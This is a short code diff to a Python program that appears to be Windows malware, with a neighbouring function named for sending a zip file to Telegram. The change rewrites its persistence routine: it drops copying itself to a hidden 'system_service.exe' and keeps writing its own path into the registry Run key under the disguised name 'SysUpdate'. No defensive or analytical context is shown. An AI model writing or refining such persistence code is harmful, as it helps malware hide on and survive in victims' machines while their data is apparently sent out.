@@ -332,32 +332,24 @@ def send_zip_to_telegram():
 
 
 # === PERSISTENCE ===
+# === PERSISTENCE ===
 def persist():
     try:
-        current_path = os.path.abspath(sys.argv[0])  # Use sys.argv[0] to ensure correct .exe
-        dest_path = os.path.join(EXTRACT_FOLDER, "system_service.exe")
+        # Skip self-copy logic entirely
 
-        # Copy to hidden location if not already running from there
-        if current_path.lower() != dest_path.lower():
-            if not os.path.exists(dest_path):
-                shutil.copy2(current_path, dest_path)
-                subprocess.call(f'attrib +h "{dest_path}"', shell=True)
-
-            # Relaunch from hidden path
-            # subprocess.Popen(f'"{dest_path}"', shell=True)
-            os._exit(0)  # Exit current instance
-
-        # Always re-add to registry on launch
+        # Just ensure registry persistence using current path
+        current_path = os.path.abspath(sys.argv[0])
         reg_key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
             r"Software\Microsoft\Windows\CurrentVersion\Run",
             0, winreg.KEY_SET_VALUE
         )
-        winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, dest_path)
+        winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, current_path)
         winreg.CloseKey(reg_key)
 
     except Exception as e:
         print(f"[!] Persistence error: {e}")
+
 
 
 
